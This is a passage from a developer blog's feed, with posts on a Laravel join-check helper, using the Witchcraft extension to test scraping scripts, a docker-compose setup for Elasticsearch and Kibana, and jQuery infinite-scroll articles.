class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$query</span>-&gt;joins)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$query</span>-&gt;joins <span class="keyword">as</span> <span class="variable">$join</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$join</span>-&gt;table) &amp;&amp; <span class="variable">$join</span>-&gt;table == <span class="variable">$table</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$join</span>-&gt;table)) &#123;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;(\w+)&#x27;</span>, (<span class="keyword">string</span>)<span class="variable">$join</span>-&gt;table, <span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$matches</span>) &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$matches</span>[<span class="number">0</span>] == <span class="variable">$table</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Usage</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$query</span> = \DB::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;table_name&#x27;</span>)-&gt;<span class="title function_ invoke__">select</span>(...);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$some_filter</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">has_table_joined</span>(<span class="variable">$query</span>, <span class="string">&#x27;table_foo&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">join</span>(<span class="string">&#x27;table_foo&#x27;</span>, ...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">where</span>(...);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Laravel &lt;a href=&quot;https://laravel.com/docs/5.8/queries&quot;&gt;Query Builder&lt;/a&gt; is an awesome feature, really.&lt;/p&gt;
&lt;p&gt;When comes to generate a</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="eloquent" scheme="http://jslim.net/tags/eloquent/"/>
    
    <category term="query-builder" scheme="http://jslim.net/tags/query-builder/"/>
    
  </entry>
  
  <entry>
    <title>The efficient way to debug JS/CSS in production site</title>
    <link href="http://jslim.net/blog/2019/08/08/The-efficient-way-to-debug-JS-CSS-in-production-site/"/>
    <id>http://jslim.net/blog/2019/08/08/The-efficient-way-to-debug-JS-CSS-in-production-site/</id>
    <published>2019-08-08T11:52:22.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I discovered <a href="https://github.com/luciopaiva/witchcraft">this package</a>, which allows us to run JavaScript &amp; css in any domain.</p><p>Before I know about this, I debug JavaScript through <a href="https://developers.google.com/web/tools/chrome-devtools/console/">Chrome console</a>.<br>But it’s quite troublesome, when I want to run a whole chunk of JavaScript code.</p><p>With this package, I can just write the code in a JS file according the domain, e.g. <strong>google.com.js</strong>,<br>so long the URL matched <code>google.com</code>, it will execute the code from <strong>google.com.js</strong>.</p><p><em>(You can find the google sample code from the installation guide)</em></p><h2 id="Another-use-case"><a href="#Another-use-case" class="headerlink" title="Another use case"></a>Another use case</h2><p>Another use case for myself, is I can use to scrap website content, and test my script here.</p><p>I use <a href="https://github.com/GoogleChrome/puppeteer">Puppeteer</a> to scrap others site content, and use JavaScript to access their DOM.<br><em>(refer to my <a href="https://github.com/jslim89/site-scraper">simple module</a>)</em></p><p>Everytime I want to test and see the output, I have to keep running the command over &amp; over again. e.g.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> body = <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// JS code goes here</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Running the script take longer time, as need to instantiate the browser, then load the page, evaluate the script, close browser.</p><p>With <strong>Witchcraft</strong>, I can now write the <code>// JS code goes here</code> to mydomain.com.js, and view the output in console.</p><p>After the output correct, then I just copy the JS code over to the scraper.</p><p>I’ve tried this on one of the eCommerce website</p><p><a href="http://shopee.com.my/search?keyword=gopro">http://shopee.com.my/search?keyword=gopro</a></p><p>And I able to get output</p><p><img src="/images/posts/2019-08-08-The-efficient-way-to-debug-JS-CSS-in-production-site/shopee-content.png" alt="Shopee search content"></p><p>The JavaScript code is pretty long</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> productCards = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.shopee-search-item-result__items &gt; .shopee-search-item-result__item&#x27;</span>), i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> data = [];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; productCards.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> productCard = productCards[i];</span><br><span class="line">    <span class="keyword">var</span> anchor = productCard.<span class="title function_">querySelector</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    data.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: productId,</span><br><span class="line">      <span class="string">&#x27;name&#x27;</span>: productName,</span><br><span class="line">      <span class="string">&#x27;link&#x27;</span>: productLink,</span><br><span class="line">      <span class="string">&#x27;price&#x27;</span>: price,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>You won’t want to write these in Chrome console right? 😏</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://luciopaiva.com/witchcraft/how-to-install.html">Install Witchcraft</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Recently I discovered &lt;a href=&quot;https://github.com/luciopaiva/witchcraft&quot;&gt;this package&lt;/a&gt;, which allows us to run JavaScript &amp;amp; css</summary>
        
      
    
    
    
    
    <category term="css" scheme="http://jslim.net/tags/css/"/>
    
    <category term="js" scheme="http://jslim.net/tags/js/"/>
    
    <category term="debug" scheme="http://jslim.net/tags/debug/"/>
    
    <category term="web-dev" scheme="http://jslim.net/tags/web-dev/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose for Elasticsearch &amp; Kibana</title>
    <link href="http://jslim.net/blog/2019/07/11/docker-compose-for-Elasticsearch-Kibana/"/>
    <id>http://jslim.net/blog/2019/07/11/docker-compose-for-Elasticsearch-Kibana/</id>
    <published>2019-07-11T11:20:29.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Create a file <strong>docker-compose.yml</strong> with the following content:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.2.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">elasticsearch_local</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.name=docker-cluster</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.type=single-node</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.cors.enabled=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.cors.allow-credentials=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.cors.allow-headers=X-Requested-With,X-Auth-Token,Content-Type,Content-Length,Authorization</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.cors.allow-origin=/https?:\/\/localhost(:[0-9]+)?/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;ES_JAVA_OPTS=-Xms512m -Xmx512m&quot;</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">esdata1:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9200</span><span class="string">:9200</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">esnet</span></span><br><span class="line">  <span class="attr">kibana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/kibana/kibana:7.2.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kibana_1</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;SERVER_NAME=kibana&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;ELASTICSEARCH_HOSTS=http://elasticsearch:9200&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5601</span><span class="string">:5601</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">esnet</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;unless-stopped&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">esdata1:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">esnet:</span></span><br></pre></td></tr></table></figure><p>Then run</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker-compose up -d</span><br></pre></td></tr></table></figure><p><em>NOTE: must specify <code>networks</code>, otherwise kibana won’t connect with elasticsearch</em></p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://alysivji.github.io/elasticsearch-kibana-with-docker-compose.html">Elasticsearch + Kibana using Docker Compose</a></li><li><a href="https://www.elastic.co/guide/en/kibana/current/docker.html">Running Kibana on Docker</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Create a file &lt;strong&gt;docker-compose.yml&lt;/strong&gt; with the following content:&lt;/p&gt;
&lt;figure class=&quot;highlight yml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
        
      
    
    
    
    
    <category term="docker" scheme="http://jslim.net/tags/docker/"/>
    
    <category term="elasticsearch" scheme="http://jslim.net/tags/elasticsearch/"/>
    
    <category term="kibana" scheme="http://jslim.net/tags/kibana/"/>
    
  </entry>
  
  <entry>
    <title>jQuery infinite scroll articles</title>
    <link href="http://jslim.net/blog/2019/06/24/jQuery-infinite-scroll-articles/"/>
    <id>http://jslim.net/blog/2019/06/24/jQuery-infinite-scroll-articles/</id>
    <published>2019-06-24T10:33:37.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Quite often, we have seen a lot of news site <em>(e.g. <a href="https://www.forbes.com/">forbes.com</a>)</em>,<br>when you scrolled until end of the article, it will shows another article.</p><p>I was working on this too, and can’t find any plugin for this.</p><p>Definitely, we need a scroll event listener</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">height</span>() - $(<span class="variable language_">this</span>).<span class="title function_">height</span>() &lt; $(<span class="variable language_">this</span>).<span class="title function_">scrollTop</span>()) &#123;</span><br><span class="line">        <span class="title function_">loadAnotherArticle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The code above will load the next article when scroll to the bottom-most.</p><p>But let say we want to load the article 500px before the bottom-most.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// this is for before reach the bottom-most, it trigger to load next article</span></span><br><span class="line">    <span class="keyword">let</span> offsetPrefix = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">height</span>() - $(<span class="variable language_">this</span>).<span class="title function_">height</span>() - offsetPrefix &lt; $(<span class="variable language_">this</span>).<span class="title function_">scrollTop</span>()) &#123;</span><br><span class="line">        <span class="title function_">loadAnotherArticle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>But then, now every time scroll, it will trigger many requests on <code>loadAnotherArticle()</code>.<br>To prevent it, add a loading flag…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// to prevent multiple requests on same article</span></span><br><span class="line"><span class="keyword">var</span> loading = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// this is for before reach the bottom-most, it trigger to load next article</span></span><br><span class="line">    <span class="keyword">let</span> offsetPrefix = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">height</span>() - $(<span class="variable language_">this</span>).<span class="title function_">height</span>() - offsetPrefix &lt; $(<span class="variable language_">this</span>).<span class="title function_">scrollTop</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!loading) &#123;</span><br><span class="line">            <span class="title function_">loadAnotherArticle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>What if want to change the URL &amp; meta title/description when scroll to next article?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helper function to update the meta content</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateMeta</span> (item) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">replaceState</span>(item, item.<span class="property">title</span>, item.<span class="property">url</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = item.<span class="property">title</span>;</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;description&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">description</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;og:title&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">og_title</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;og:description&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">og_description</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[property=&quot;og:image&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">image</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[property=&quot;og:url&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">url</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The tricky part comes, what URL should be used if in the middle of 1st &amp; 2nd article?<br>Here what I do is, determined by the visible area, which every is higher.</p><p>Let’s update the scroll event</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// those articles already loaded to `&lt;body&gt;`</span></span><br><span class="line"><span class="keyword">var</span> loadedArticles = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ref: https://stackoverflow.com/questions/24768795/get-the-visible-height-of-a-div-with-jquery/26831113#26831113</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">elementVisibleHeight</span> ($el) &#123;</span><br><span class="line">    <span class="keyword">var</span> elH = $el.<span class="title function_">outerHeight</span>(),</span><br><span class="line">        H   = $(<span class="variable language_">window</span>).<span class="title function_">height</span>(),</span><br><span class="line">        r   = $el[<span class="number">0</span>].<span class="title function_">getBoundingClientRect</span>(), t=r.<span class="property">top</span>, b=r.<span class="property">bottom</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">0</span>, t&gt;<span class="number">0</span>? <span class="title class_">Math</span>.<span class="title function_">min</span>(elH, H-t) : <span class="title class_">Math</span>.<span class="title function_">min</span>(b, H));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// I use lodash for array processing</span></span><br><span class="line">    <span class="comment">// assign the visible height value to each loaded articles</span></span><br><span class="line">    _.<span class="title function_">each</span>(loadedArticles, <span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="property">visibleHeight</span> = <span class="title function_">elementVisibleHeight</span>($(<span class="string">&#x27;#article-&#x27;</span> + item.<span class="property">id</span>));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now get the article that has maximum visible area</span></span><br><span class="line">    <span class="keyword">var</span> maxItem = _.<span class="title function_">maxBy</span>(loadedArticles, <span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> item.<span class="property">visibleHeight</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prevent it trigger multiple times</span></span><br><span class="line">    <span class="keyword">if</span> (maxItem.<span class="property">title</span> != $(<span class="string">&#x27;title&#x27;</span>).<span class="title function_">text</span>()) &#123;</span><br><span class="line">        <span class="title function_">updateMeta</span>(maxItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Now the final version will be like</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// to prevent multiple requests on same article</span></span><br><span class="line"><span class="keyword">var</span> loading = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// those articles already loaded to `&lt;body&gt;`</span></span><br><span class="line"><span class="keyword">var</span> loadedArticles = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateMeta</span> (item) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">replaceState</span>(item, item.<span class="property">title</span>, item.<span class="property">url</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = item.<span class="property">title</span>;</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;description&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">description</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;og:title&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">og_title</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[name=&quot;og:description&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">og_description</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[property=&quot;og:image&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">image</span>);</span><br><span class="line">    $(<span class="string">&#x27;meta[property=&quot;og:url&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>, item.<span class="property">url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ref: https://stackoverflow.com/questions/24768795/get-the-visible-height-of-a-div-with-jquery/26831113#26831113</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">elementVisibleHeight</span> ($el) &#123;</span><br><span class="line">    <span class="keyword">var</span> elH = $el.<span class="title function_">outerHeight</span>(),</span><br><span class="line">        H   = $(<span class="variable language_">window</span>).<span class="title function_">height</span>(),</span><br><span class="line">        r   = $el[<span class="number">0</span>].<span class="title function_">getBoundingClientRect</span>(), t=r.<span class="property">top</span>, b=r.<span class="property">bottom</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">0</span>, t&gt;<span class="number">0</span>? <span class="title class_">Math</span>.<span class="title function_">min</span>(elH, H-t) : <span class="title class_">Math</span>.<span class="title function_">min</span>(b, H));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// this is for before reach the bottom-most, it trigger to load next article</span></span><br><span class="line">    <span class="keyword">let</span> offsetPrefix = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">height</span>() - $(<span class="variable language_">this</span>).<span class="title function_">height</span>() - offsetPrefix &lt; $(<span class="variable language_">this</span>).<span class="title function_">scrollTop</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!loading) &#123;</span><br><span class="line">            <span class="title function_">loadAnotherArticle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// I use lodash for array processing</span></span><br><span class="line">    <span class="comment">// assign the visible height value to each loaded articles</span></span><br><span class="line">    _.<span class="title function_">each</span>(loadedArticles, <span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="property">visibleHeight</span> = <span class="title function_">elementVisibleHeight</span>($(<span class="string">&#x27;#article-&#x27;</span> + item.<span class="property">id</span>));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now get the article that has maximum visible area</span></span><br><span class="line">    <span class="keyword">var</span> maxItem = _.<span class="title function_">maxBy</span>(loadedArticles, <span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> item.<span class="property">visibleHeight</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prevent it trigger multiple times</span></span><br><span class="line">    <span class="keyword">if</span> (maxItem.<span class="property">title</span> != $(<span class="string">&#x27;title&#x27;</span>).<span class="title function_">text</span>()) &#123;</span><br><span class="line">        <span class="title function_">updateMeta</span>(maxItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="P-S"><a href="#P-S" class="headerlink" title="P/S:"></a>P/S:</h3><ul><li><code>loadAnotherArticle()</code> implement by yourself</li><li>The assumed article object is like</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;How to kickstart JavaScript?&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This is the description&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;og_title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;How to kickstart JavaScript?&quot;</span><span class="punctuation">,</span></span><br><span 